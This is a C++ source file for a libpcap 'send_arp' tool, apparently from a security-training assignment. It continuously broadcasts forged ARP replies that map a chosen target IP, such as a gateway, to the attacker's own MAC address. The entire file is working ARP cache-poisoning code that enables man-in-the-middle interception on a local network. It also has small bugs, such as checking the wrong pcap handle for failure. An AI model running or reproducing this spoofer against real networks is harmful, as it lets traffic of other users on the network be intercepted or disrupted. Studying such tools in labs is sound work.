//[BOB 8TH] JAEHYEON SEND_ARP main.cpp CODE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <pcap/pcap.h>
#include <arpa/inet.h>
#include "header.h"
#include <unistd.h>

#include <sys/fcntl.h>
#include <sys/errno.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>

void Usage(char *argv){
    printf("Usage : %s [Interface] [Sender IP] [Target IP] \n", argv);
    printf("Example) ./send_arp eth0 192.168.0.11 192.168.0.1 \n");
}

int main(int argc, char* argv[]){
    if(argc != 4){
        Usage(argv[0]);
        return -1;
    }
    char* dev = argv[1]; //argv[1] = Interface
    uint32_t SenIP = inet_addr(argv[2]); //argv[2] = Sender IP
    uint32_t TarIP = inet_addr(argv[3]); //argv[3] = Target IP
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    struct etherh etherh;
    struct arph arph;
    struct packet packet;

    //MY_MAC : Helped(http://www.drk.com.ar/code/get-mac-address-in-linux.php)
    struct ifreq ifr;
      int s;
      if ((s = socket(AF_INET, SOCK_STREAM,0)) < 0) {
        perror("socket");
        return -1;
      }
      strcpy(ifr.ifr_name, argv[1]);
      if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        return -1;
      }
      u_char *hwaddr = (u_char *)ifr.ifr_hwaddr.sa_data;
    //MY_MAC end

    u_char broadMac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    //Send_ARP
	while(1){
        arph.op = 0x0200;
        memcpy(&etherh.SMAC, &hwaddr[0], 6); //Source MAC
	memcpy(&etherh.DMAC, &broadMac, 6); //Destination MAC
        memcpy(&arph.SenMAC, &hwaddr[0], 6); //Sender MAC
	memcpy(&arph.TarMAC, &broadMac, 6);
        memcpy(&arph.SenIP, &TarIP, sizeof(TarIP)); //Sender IP
        memcpy(&arph.TarIP, &SenIP, sizeof(SenIP)); //Target IP
        packet.arp = arph;
        packet.eth = etherh;
        pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
            return -1;
        }
        int res2 = pcap_sendpacket(handle2,(u_char*)&packet, 42);
	printf("SENDING MYMAC ARP BROADCAST!!");
        if(res2 == -1){
            printf("Send Fail \n");
        }
        pcap_close(handle2);
	sleep(2);
    }
}
